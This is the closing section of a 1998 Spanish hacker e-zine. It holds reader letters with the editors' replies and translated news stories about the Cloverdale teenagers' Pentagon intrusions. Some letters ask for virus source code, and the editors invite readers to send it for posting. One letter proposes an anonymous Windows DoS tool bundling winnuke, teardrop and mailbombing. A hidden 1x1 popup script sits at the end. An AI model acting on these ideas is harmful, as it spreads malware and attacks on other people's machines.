  Un gusto escribirles de nuevo ... solo escribo para decirles que la 
  pagina esta muy buena esta chulisima .. en especial el applet ... a todo 
  esto tengo una pagina con este applet asi que espero que no piensen que 
  les ando copiando el formato jejej .,,.. okis nos vemos pronto les envio 
  informacion para presentarles un nuevo E-Zine made in chile .. llamado 
  Proyecto_R en el cual trataremos de abordar algunos temas no tan 
  manoseados ... ademas pronto les enviare info sobre el Komando A.P.I. 
  komando Anti Pornografia Infantil , somos un grupo de wannabes y 
  hackers luchando en contra de la pornografia infantil en su mayoria 
  latinoamericanos , grupo al kual pertenece katiuska la creadora del 
  famoso Viruz en contra de la pornografia infantil . 

  Nos Belmont Chikoss 

  Un Afectuoso Saludo de 

  PlaXiuS 
  irc dalnet canal #chile 
  http://www.geocities.com/soho/lofts/5372 

  <------>

  [ El web es todo trabajo de Mac Crack (la verdad es que se lo curra ;)
    Lo del ezine nos parece muy bien y ya nos avisaras cuando este el
    primer numero :) y tb estamos deseosos de saber sobre lo de A.P.I.
    ya que nosotros estamos en contra de la pornografia infantil!!!
    Suerte con vuestros proyectos ;-)) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Thu, 02 Apr 1998 05:17:43 +0000
  From: astruc@xxxxxxxxxxxxxx  
  Subject: Felicidades
  To: jjf_team@hotmail.com

  Felicidades por vuestro ezine. Con vuestro permiso, incluiremos
  un link en nuestra pagina.
  Saludos.
 
  astruc@smileyface.com
  http://www.olivet.com/astruc

  <------>

  [ Thx y claro, no problemo!! ;-) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  From zyklon@galaxycorp.com Mon Apr 13 08:33:07 1998
  To: jjf_team@hotmail.com
  From: zyklon <zyklon@xxxxxxxxxxxxxx>  
  Subject: e-zine

  El e-zine eesta bastante bien.Os queria comentar si teneis intenciones
  de escribir sobre ip-spoofing,dada la poca info ke hay sobre el tema
  en espa§ol programas ke hay,ejemplos de como suplantar otra ip etc...si
  no,si sabeis algo del tema o teneis algun ficherillo,os agradeceria me lo
  mandaseis para investigarlo
  ....y asi poder ser un futuro articulo en el e-zine.....
        
 			........al diablo siempre tiene 
                                trabajo para las manos 
                                que no hacen nada..........

  <------>

  [ El tema del IP-Spoofing ya fue tratado en este ezine en el 2 numero, pero
    no descartamos la idea de seguir con el tema :), lo de enviar ficheros
    no puede ser, en todo caso pasate por nuestro web.
    Esperamos tu articulo ;-) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Wed, 15 Apr 1998 01:13:35 GMT
  From: "Ottmar Figueroa R." <fottmar@xxxxxxxxxxxxxx>
  To: conde_vampiro@usa.net
  Subject: saludos 

  Holas.

  Queria preguntarte, que de cierto tiene el asunto del virus de Access y de 
  ser cierto, si Uds. tienen como disponer del codigo o una copia del virus 
  (para efectos educativos). 

  Gracias. 
  racias. 

  <------>

  [ En nuestra seccion de Virus en el web, seguro que encontaras cosas que
    te seran util. Si que existen virus de Access pero nosotros no disponenos
    del codigo fuente por el momento, por lo que si alguien lo tiene que nos
    lo envie y lo colgaremos en el web :) ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Thu, 16 Apr 1998 17:50:55 GMT
  From: Luis Alfonso Alvarez Sestelo <geyper@xxxxxxxxxxxxxx>
  To: conde_vampiro@usa.net

  Hola, te escribo para decirte que estais haciendo un gran labor con 
  vuestra revista. Creo que de todas las espanholas es la que mas ayuda a la 
  gente novel en este campo. Me gustaria que me dijeses si existe la 
  posibilidad de que fueses mi "mentor". Soy una persona a la que le gusta 
  aprender y creo que lo hago bastante rapido pero hay cosas que se me 
  resiste. Espero que no pienses que quiero tomarte el pelo o que soy de la 
  poli o algo asi. Estoy dispuesto a contestarte a cualquier pregunta que 
  desees hacerme y en caso de que no puedas o no quieras hacerlo, sin 
  problema 
  Saludos 

  geyper:) 

  <------>

  [ Pues thx pero por desgracia no podemos ayudarte, si lo que quieres es
    aprender lee nuestro ezine y demas documentos nuestros e intenta
    escribir algun articulo para ir cogiendo soltura. Nuestro consejo es que
    leas todo lo que puedas y hagas tus propios experimentos pero siempre
    con cuidado de lo que haces. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Mon, 20 Apr 1998 20:44:01 GMT
  From: ferran picornell <fpicornell@xxxxxxxxxxxxxx>
  To: conde_vampiro@usa.net
  Subject: Traduccion

  PlÅE.. kalguien me traduzca el texto de iniciacion al phreaking. I si te 
  viene bien, me mandas los que tengas traducidos. :-) 
  Grcias, y astalavista! 
  -Sardaukar 

  daukar 

  <------>

  [ Nosotros por el momento no podemos pero si algun lector le interesa, pues
    que lo traduzca y nos lo envie al ezine :), lo referente a ya traduciodos
    nosotros no hemos visto nada al respecto. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Tue, 21 Apr 1998 23:03:37 GMT
  From: <JIBINARRIAGAD@xxxxxxxxxxxxxx>
  Subject: Un novato lector tuyo 

  Hola tio, soy un chaval de 17 a§os que acaba de empezar a leer cosas sobre
  el hacking. Encontre vuestro E-zine en un pagina y os ponian muy bien asi
  que me lo baje. He de decirte que es muy bueno y me ha gustado mucho, ya
  que no es muy complicado.
  Te escribo porque me gustaria que fueras mi profesor :-) acerca sobre el
  hacking porque a pesar que todos los hackers decis que es muy facil no lo
  es tanto aunque si mas de lo que parece. Como he dicho soy un novato tanto
  en esto del hacking como de la Red como de los ordenadores, pero no te
  desesperes ya que a E-zines como la tuya o Saqueadores (muy buena y muy
  facil de entender) he aprendido bastante sobre la Red que no viene en
  revistas del mundo de la informatica como Pc-actual.
  Pues lo dicho te agradeceria mucho tu ayuda porque de verdad me gusta y
  tengo ganas de aprender porque ademas esto no te ense§an en la carrera,
  pero si no quieres o estis muy ocupado, tranquilo lo comprendere :-),
  supongo que te habran escrito muchos como yo. :-D
  Mi direccion es: jibinarriagad@xxxxxxxxxxxxxx
  Muchas gracias por tu atencion
  Jaime

  <------>

  [ Thx pero no podemos ayudarte, ya que como hemos dicho antes no vamos
    dando clases privadas, pero para eso teneis nuestro/vuestro ezine, en el
    cual plasmamos nuestros conocimientos :) para que podais aprender el
    significado real del hacking, que siemplemente es la curiosidad y las
    ganas de aprender. Decirte tb que el hacking no es facil por mucho que
    digan. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

  Date: Wed, 22 Apr 1998 05:33:28 GMT
  From: stain@xxxxxxxxxxxxxx
  To: jjf_team@usa.net
  Subject: felicitaciones a Nobody x el doc de hackig en Win 95 y mas... 

  Amigos del JJF Hackers Team, les escribo de paso para decirles que la
  revista me parece excelente. No veo la hora que salga la proxima. Sigan
  asi, con mucho empuje. 

  El motivo de mi mail era para el se§or Nobody (me dirijo a el a traves de 
  ustedes porque no tengo su e-mail). Queria felicitarlo por el magnifico
  trabajo que hizo en el documento "La superquia del Hacker". Hacia falta que
  alguien escribiera sobre como hackear al/desde Windoze 95 (por mas que
  todos sigamos prefiriendo el Unix porque es lo mejor que hay y porque....
  buehhh, ya saben el resto).
  En mi humilde opinion, a este sistema operativo se lo deberia seguir 
  investigando para encontrarle fallas (que tiene da a millones) y ver como 
  hackearlo y como hackear desde el, o como hundirlo :)  Esto lo digo porque
  no se donde lei que el uso del Windoze NT estaba creciendo a pasos
  agigantados y en el futuro Unix se iria dejado de usar; para lamento de
  todos nosotros.
  En segundo lugar, hackear Unix es como cosa conocida, hay bugs, exploits, 
  nukes, backdoors, sniffers y cientos de cosas mas de a montones y por
  doquier.
  Pero que hay con Win 95.NT? Poco y nada. Es por esto que seria de mucho
  agrado para los que usan Win 95/NT como alternativa que Nobody (porque fue
  el primero) o alguien del JJF-HT escribiera una segunda guia para hackear
  desde Windows 95 mas avanzada y tecnica, detallando mas tecnicas, metodos y
  programas que hay (alguien dijo IP spoffing en Win 95????). 
  Otra cosa: ustedes bien saben que hay muchos ataques del tipo Unix to 
  Windows: land, sync flood, bonk, winnuke, boink, teardrop y semejantes. Se 
  podria hacer todo esto Windows to Windows? A mi me gustan los desafios, y a 
  ustedes? No seria bueno que ALGUIEN (ohhh quien sera ese benevolo ser?)
  hiciera un programejo con todos estos ataques DoS (agregandole quiza mas
  utilidades como mailbomer, mail anonimo y etc..) en castellano, de paso? 
  Por que? se preguntaran. Imaginen la siguiente situacion: estan usando Word
  o Excel (Win 95) y se acordaron que quieren jugarle una bromita (peque§a) a
  un amigo. En vez de... guardar todo, cerrar el programa, rebotear, comenzar
  Linux, esperar a que cargue, utilizar los ataques DoS o similares contra
  esa persona, salir de Linux, rebootear, iniciar Win 95, esperar a que
  cargue, abrir Word o Excel y continuar trabajando... no seria mas facil
  ejecutar ese superprogramejo cagaWindoze cien veces mas potente que el
  comun Winnuke, en espanol; mandarle el tipo de ataque que querramos
  (pudiendo ser casi anonimos porque el programa utilizaria varios servers y
  proxies) mientras continuamos con nuestra sesion de Wor o Excel? No seria
  mas facil?
  Ideas? tengo muchas, posibilidades? pocas porque lamentablemente ya estoy 
  viejo para aprender a programar en Windoze. 

  Desde ya muchisimas gracias por su tiempo y paciencia, espero que me puedan 
  ayudar (o que Nobody haga algo) 

  STAIN 

  PD: el doc de Daemon sobre hackear Unix me parecio excelente tambien. Pero
  la idea de que hay poco escrito sobre como hackear desde Win 95 o como
  hackearlo es muy fuerte... 

  <------>

  [ Nosotros por el momento no tenemos pensado sacar una guia sobre hack en
    win95 pero nunca sa sabe. Si no recuerdo mal si se puede hacer esos
    ataques desde un win95 a otro ya que si existen programas para ello,
    pero tambien hay que decir que estar perdiendo el tiempo en nukes y
    similiares es una tonteria, hay cosas mejores en las que perder el tiempo.
    Decirte que en NT si que estamos trabajando por lo que el algun tiempo
    ya daremos alguna sorpresa ;-) ]

  [ Nobody : Pues thx y a lo mejor si que aparece una 2 parte ya que lo tenia
    pensado cuando acabe la primera :)) y si que se puede el IP-spoof en win
    y eso seria una de las cosas incluidas, pero ya veremos ya que estoy
    bastante ocupado.
    Y como primicia te dire que a lo mejor saco dentro de una temporada una
    guia de hacking con el s.o. Inferno ;-) pero ya se vera.
    Yo prefiero Unix que win pero al ver que poca informacion hay sobre el
    hacking en win, por eso decide escribir esta guia, la cual por lo visto
    esta agrando mucho y eso es bueno :)
    Byes. ]

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

                           ------------------------
                           - NOTICIAS UNDERGROUND -
                           ------------------------
  
                                                - J.J.F. / HACKERS TEAM -

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
  EX-AGENTES DEL KGB ENVUELTOS EN DELITOS INFORMATICOS.

        Experimentados agentes del KGB, quienes durante la Guerra Fria
  adquirieron elevados conocimientos estan siendo acusados por el crecimiento
  de delitos informaticos provenientes del Este de Europa.

        Uno de los usarios de Internet afectados lucha contra una factura de
  1800 dolares alegando que ella es victima de estos hackers entrenados por
  el gobierno, que ahora estan relacionados con la Mafia Rusa y otros
  paises del Este.
         
        Mary Picken, un usuario de CompuServe, cree que ellos decodificaron
  su password y usaron su cuenta incrementando su factura, que tarifa unas
  1000 horas de conexion a Internet desde alguna terminal del Este de
  Europa.

        Picken, quien esta a punto de ser expulsada de su trabajo en la
  oficina de arte STUC, insiste que ella nunca ha accedido al sistema desde
  fuera de UK y tampoco a relevado su contrase§a a nadie jamas.

        CompuServe se niega a admitir culpabilidad. La compa§ia le a ofrecido
  un credito del 50% como un gesto de buena voluntad, pero dice que no cree
  que haya habido una brecha de seguridad. Por el contrario, CompuServe asume
  que Picken uso su cuenta mientras viajaba por el extranjero o autorizo el
  uso de su cuenta a alguien o divulgo su clave a una tercera parte.

        Sin Embargo, existen evidencias de que otros usuarios de
  CompuServe han sufrido casos similares.

        Dr Neil Barret, uno de los mejores expertos en seguridad informatica
  de UK, conto al Scotland el domingo, que puede ser posible para
  experimentados Hackers robar cuentas de Internet por la red.

        "Existe un amplio rango de metodos que pueden ser usados pero uno de
  los favoritos es un programa sniffer que se instala para buscar
  determinados patrones en una seccion de codigo", explico.

        "Otro metodo es conducir a una persona a un determinado lugar en
  Internet y obligarles a dejar sus datos personales. Si dejamos nuestra
  cuenta de correo en algun lugar ya damos mucha informacion sobre nosotros.
  Tambien es posible esperar por alguna informacion en particular para
  luego ser enviada o haver sido programado para ir a un lugar espeficico de
  nuestro ordenador para coger nuestra contrase§a y datos personales."

        En pleno debate alrededor de CompuServe, un hombre conocido
  unicamente como Tom describe como un amigo suyo a vistado un servidor en
  el cual se anunciaba un ordenador gratis.

        Despues de dejar su direccion de correo, la factura de su cuenta de
  Internet comenzo a incrementarse desde algun lugar de Europa.

        El Centro para Estudios Estrategicos Internacionales, un tanque ligero
  de Washington con cierta relacion con la Agencia de Inteligencia, sostiene
  que el Bloque del Este es uno de los centros mas proliferos de hacking del
  mundo. Barret dice que las cuentas de Internet hackeadas son vendidas por
  criminales, envueltos desde el transporte de software pirateado hasta
  el trafico de drogas.

        Este fraude es el desarrollo de otra forma de las telecomunicaciones.
  En uno de sus mas recientes casos, un grupo de hackers cargaba las tarjetas
  del gigante AT&T, una empresa de telecomunicaciones de los EE.UU. El uso
  de estas tarjetas le cuesta a la compa§ia 78 millones de dolares.

        Picken se puso en contacto con la policia pero como su cuenta fue
  usada en el extranjero la policia no puede investigar. Ademas CompuServe se
  niega a explicar desde donde fue la conexion exactamente por lo no es
  posbile denunciarlo a la Interpol o a la propia policia del pais envuelto.

  SCOTLAND ON SUNDAY 15/02/98 P6 

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
  EL PENTAGONO ATACADO POR HACKERS.

        Las redes informaticas desclasificadas del Pentagono fueran da§adas
  por "unos ataques ciberneticos" de parte de unos hackers durante el
  reciente conflicto del Golfo Persico, revelo ayer un oficial del
  departamento de defensa. El asalto en uno de los sistemas informaticos mas
  seguros del ejercito de los Estados Unidos durante las 2 ultimas semanas
  fue "el mejor ataque organizado sistematicamente sufrido por el Pentagono
  hasta la fecha actual", dijo John Hamre, el delegado de la Secretaria de
  Defensa.

        Pero los ataques, que estan siendo investigados por el Pentagono,
  el FBI y por el departamento de justicia, parece que no tiene relacion
  directa con el conflicto Iraqui. Tiene toda "la apariencia de ser un juego"
  y que fue perpretado "por un numero reducido de individuos", dice el. El
  ataques de los hackers se concentro en los sistemas desclasificados del
  Pentagono, como personal y nominas, dice el se§or Hamre. Todos los servicios
  del Pentagono fueron "penetrados en algun grado". Aunque "fueron muchos y
  bastante sofisticados", el considera los ataques como de "mirones o
  vandalismo".

        "Nuestras redes clasificadas estan intactas y no han sido penetradas"
  , dijo el se§or Hamre. Estos ataques demuestran el devastador potencial de
  los asaltos de los Hackers y "cyber terroristas". En el ultimo Octubre, la
  comision del presidente Bill Clinton encargada de la proteccion de
  infraestructura critica manifesto que "el potencial de desastre es real".
  El informe, por el ya retirado general Robert Marsh de las fuerzas aereas,
  revelo un plan de cinco a§os para incrementar la seguridad en sistemas
  sensibles del gobierno y compa§ias privadas de defensa, energia, bancos y
  compa§ias telefonicas.

        En Diciembre, ministros de justicia y de interior del Grupo de los
  Siete encargados del poder economico, incluido el secretario de la Casa
  Blanca, Jack Straw, firmaron un acuerdo en Washington para coordinar los
  esfuerzos contra el delito digital.

  GUARDIAN 26/02/98 P14 

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
  EL FBI ORGANIZA UNA ENORME REDADA PARA ATRAPAR UNOS ADOLESCENTES DE UN
                            PUEBLECITO.

  COMTEX NewswireTuesday, March 03, 1998 12:52:00 AM 

  ZDNet News (February 27, 1998) - 

        El FBI estuvo durante seis semanas dedicando mas de 20 agentes en un
  esfuerzo de detener a una serie de individuos organizados los cuales
  penetraron el Pentagono. Pasado dos noches de la penetracion, la agencia
  se encontro que despues de todo el proceso de investigacion los intrusos
  resultasen ser un grupo de ni§os.

        Durante la detencion, los agentes cogieron a los adolescentes,
  identificando a un estudiante escolar de 15 o 16 a§os, en el proceso de
  entrar en sistemas informaticos no-clasificados. Una segunda redada fue
  llevada en la casa de otro adolescente sospechoso de tomar parte en la
  penetracion del Pentagono. La redada fue llevada a cabo en Cloverdale,
  un pueblo de 5000 residentes a unas 100 millas del norte de San Francisco.

        Los dos adolescentes, al ser menores, no fueron arrestados, pero el
  FBI confisco sus equipos informaticos y software en ambas casas. "Son
  buenos chicos", decia Michael Carey, el superintendente del distrito escolar
  de Cloverdale. "Espero que no haya cargos contra ellos".

        Con esto finaliza un capitulo en la investigacion de diversas
  penetraciones en los ordenadores desclasificados del Pentagono. La redada
  ocurrio un dia despues de que el delegado de la Secretaria de Defensa John
  Hamre revelase que 11 sistemas desclasificados del Pentagono han sido
  penetrados durante este mes.

        De acuerdo con las investigaciones federales, otros estudiantes de
  Cloverdale estan siendo interrogados por el Servicio Secreto y por agentes
  del FBI. Se sospecha que los actos de hacking fueron llevados a cabo por un
  grupo de jovenes, quienes luchaban haber quien penetraba antes en los
  ordenadores del gobierno.

        "La mayoria de aqui piensa que esto fue una especie de concurso
  informatico" decia un estudiante del colegio superior de Cloverdale. A
  principios de este semana, Hamre el delegado de la Secretaria de Defensa
  dijo que la penetracion fue "el mejor ataque organizado sistematicamente
  sufrido por el Pentagono hasta la fecha actual".

        "Esto dice cosas sorprendentes de la habilidad de los chicos y
  tambien la poca seguridad que tiene el Pentagono" decia un Hacker que no
  tiene relacion con los incidentes, que prefiere ser conocido con su apodo,
  darkcube. Pero la cazeria todavia no ha finalizado, segun Bill Zane, quien
  tiene un Servidor de Internet llamado Netdex con 3000 usuarios en Santa
  Rosa, California. Los hackers aparentemente entraron en Netdex para
  dirigirse al Pentagono. De hecho, Zane posiblemente fue el primero que
  aviso sobre los intrusos. "Hay por lo menos uno o como mucho dos mas
  todavia libres", decia Zane. "No solo son estos dos chicos."

        Zane, junto a los administradores del MIT (Massachusetts Institute of
  Technology) y de la Universidad de Berkely, monotorizaron a los intrusos y
  picharon sus comunicaciones. Esto mensajes junto a los distintos metodos
  de operar hace creer a Zane que hay mas gente inculpada en el caso y que
  ademas son adultos.

        "Los metodos fueron mas sofisticados y mucho mas serios", decia.

        Para estos dos jovenes hackers, cuyos crimenes pueden haver cometido.
  "Yo estaria mas concienciado si hubieran hackeado el sistema del colegio o
  cambiado las notas," decia el Superintendente Carey. "Fue mas un inocente
  juego que un ataque malicioso."
  
  Copyright (c) 1998 Ziff-Davis Publishing Company. All rights reserved.

  For additional Ziff-Davis online information, access Ziff-Davis on
  Compuserve (GO ZIFFNET) or ZD Net on the Internet (http://www.zdnet.com)

  Copyright 1998

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
  HABLA EL HACKER DEL PENTAGONO.

  WIRED Internet
  
  12:17pm 

        Uno de los dos adolescentes detenidos la semana pasado por el FBI
  por hackear servidores del gobierno dijo que el seguia teniendo acceso de
  administrador en cientos de redes gubernamentales y militares.
  Adicionalmente, los colegas del joven dijeron, que se havia
  sensacionalizado la historia en los medios de comunicacion, y que estaban
  planeado "venganzas electronicas."

        EL hacker, que operaba bajo el apodo de Makeveli, hizo diversos
  comentarios en diferentes conversaciones telefonicas e intercambios de
  email con John Vranesevich, fundador del grupo de seguridad informatica
  AntiOnline.

        Vranesevich ha publicado diversos extractos de sus conversaciones con
  Makeveli en su pagina web, que esta dedicada a educar al publico sobre
  cuestion de seguridad informatica. Durante el curso de cinco conversaciones
  telefonicas, el joven, un junior en la escuela superior de Cloverdale,
  California, dijo que enviaria una cinta sobre su encuntro con el FBI la
  semana pasada.

        "Ellos vinieron a mi casa, me retuvieron en el salon, y empezaron a
  sacar todo el equipo informatico de mi cuarto," contaba Makaveli a
  Vranesevich. "Ni siquiera dejaron el cable que conectaba la pared con el
  modem". "Tambien cogieron todos mis CD's - CDs musicales, CDs de ordenador,
  mi impresora, altavoces, todo," decia Makaveli.

        Vranesevich dijo que Makaveli le dijo que el y su compa§ero, quien
  operaba bajo el apodo de TooShort, ambos viven en el mismo vecendario y
  ambos fueron visitados por los agentes federales la misma noche.

        "Ellos estaban muy confudidos por el modo que en el FBI les trataba,
  los jovenes usaron la palabra 'de asperos'," dijo Vranesevich, que dijo que
  Makaveli contacto con el por la reputacion de AntiOnline en la comunidad
  hacker y su alto conocimiento sobre cuestiones de seguridad informatica.

        Makaveli nunca fue esposado, ni siquiera arrestado. Aunque todo su
  equipo fue confiscado por los agentes, de acuerdo con Vranesevich, el
  joven sigue teniendo acceso a Internet en la escuela, y hoy mismo le a
  enviado correo.

        "Una de las cosas (los agentes) que repetian una y otra vez era 'LLNL'
  (Lawrence Livermore National Laboratory) - ellos querian saber si el havia
  leido algun fichero de alli, si se acordaba del nombre de algun fichero o
  carpeta, y si sabia si hubiese algo clasificado," dijo Vranesevich.

        La semana pasada el delegado de la Secretaria de Defensa John Hamre
  dijo a los periodistas que durante las recientes semanas el Pentagono ha
  sido objeto de los mas sofisticados y organizados ataques hasta la fecha.
  Pero segun Vranesevich, Makaveli le dijo que Hamre estaba generalizando.

        "Por lo que parece que cualquier servidor .gov o .mil es un servidor
  del Pentagono," decia Makaveli, refiriendose a los cientos de maquinas que
  son clasificadas como gubernamentales o militares, pero podian ser
  cualquier cosa desde servidores del Departamento de Agricultura, hasta
  web's de reclutamiento del ejercito.

        Hamre dijo que ningun sistemas clasificado a sido accedido, pero
  Makaveli no esta de acuerdo.
                                                                    
        "Uno de los sitios que (los agentes del FBI) estuvieron preguntando
  repetidas veces era uno de los llamados 'clasificados.' Era el LLNL."
                               
        Vranesevich dijo que Makaveli le dijo a los agentes que no sabia que
  maquinas o ficheros eran clasificados, pero que el habia obtenido root -
  o privilegios de administrador - en cientos de maquinas, incluidas aquellas
  en el Lawrence Livermore Lab.
                                                                             
        "El sentia que (los agentes del FBI) trataban de ir tras el otro
  chico que era de un pais extranjero, quien era su mentor" dijo Vranesevich.
                                          
        "El me conto que este chico 'era tan bueno, que jamas lo encontraran,'
  dijo Vranesevich. "[Makaveli dijo] Yo no se quien es realmente, pero viene
  de un pais en el cual, si alquien sipiese quien es, le disparaian un tiro
  en la cabeza. Por eso se a de protejerse tan bien," le conto Makaveli a
  Vranesevich.
                            
        El joven experto en seguridad dijo que su historia a sido mal enfocada
  por los medios de comunicaciones, el gobierno, y por el due§o del Servidor
  de Internet en Santa Rosa.

        "Ese tio (Bill Zane el due§o de Netdex) este fuera de onda - y nada de
  hack fue cometido alli," le conto Makaveli a Vranesevich. Por el contrario,
  el joven admitio de haver obtenido privilegios de administrador en los
  servidores de Netdex y haver instalado las herramientas de seguridad que
  despues Zane se jacta de haver usado para perseguirlos.

        Zane conta a Wired News que Makaveli "uso varias maquinas, incluido
  las nuestras, en una secuencia de telnets para sus actos hacking," aseguro
  el a la revista. Ademas confirmo que Makaveli havia obtenido root en sus
  servidores, pero ya no lo tiene mas.
                                    
        Vranesevich dijo que mientras los servidores de web no contengan
  ningun fichero sensible, suelen ser usados para saltar entre diversos
  sistemas dentro de una red." (Makaveli y TooShort) saltaban de una maquina
  a otra, porque asi esto les permite tener acceso valido a un host (que
  generalmente requiere venir de un sitio interno de la red) para acceder a
  otra maquina" comenta Vranesevich.
             
        Zane se niega a explicar las tecnicas de Makaveli, o sus tecnicas de
  seguridad, y ademas se queja del poco cuidado por parte de sus padres y
  profesores.
                                 
        "Para usar la autopista de la informacion como una metafora, tu no
  pones a un chico en un coche y le dejas conducir por la autopista," dice
  Zane, quien dice que las actividades en Intenet de los chicos tendria que
  estar supervisada. "Una cosa es usar los ordenadores en un lugar, y otra
  usarlos en Internet," dice Zane

        Makaveli conto en entrevistas anteriores que su notivacion fue
  de caracter politico. "Es poder, ya sabes, poder" dice el, refiriendose a
  la busqueda del conocimiento que mueve a los Hackers a cometer actos
  ilicitos.

        Vranesevich dijo que Makaveli y TooShort no tienen sorprendentes
  habilidades, ellos fueron cogidos y se predente que sean un modelo. 

        "No hay nada de especial en gente como Makaveli que sabe como
  penetrar un sistema, luego se resienten de las consecuencias," dice
  Vranesevich.
                           
        Makaveli termino su conversacion sugiriendo que sus amigos en la
  comunidad hacker estaban considerando una posible venganza - ya que todavia
  tienen un as en la manga.
                               
        "Me gustaria avisar al FBI, que todavia hay muchos servidores
  hackeados que ellos no saben, pero pronto se daran cuenta de ello," le
  conto Makaveli a Vranesevich. 

<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>
€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
<ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ>

        Bueno chicos, pues aqui acaba el numero cuatro de nuestro/vuestro
  ezine y esperamos que os haya gustado y que vuestros conocimientos hayan
  mejorado en mayor grado o por lo menos un poco ;-)

        Despues de este magnifico numero (o eso pensamos :) tendreis que
   esperar unos dos meses para el siguiente, que conste que intentamos que
   sea el menor tiempo posible, pero eso depende de vuestra colaboracion con
   el ezine o sea que ya sabeis!!

        Y como siempre decimos, enviarnos vuestros articulos, sugerencias,
  criticas, propuestas, actos de hacking }:-) o lo que quieras para ir
  mejorando el ezine, a la siguiente direccion :

  jjf_team@usa.net

                         ADIOS Y HASTA EL SIGUIENTE NUMERO!!!
                               - J.J.F. / HACKERS TEAM -

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

<head>
<script LANGUAGE='JavaScript' TYPE='text/javascript'>

window.open('http://www.550m.com/popup1.asp', 'emnetwork_popup','width=1,height=1');

</script>
</head>

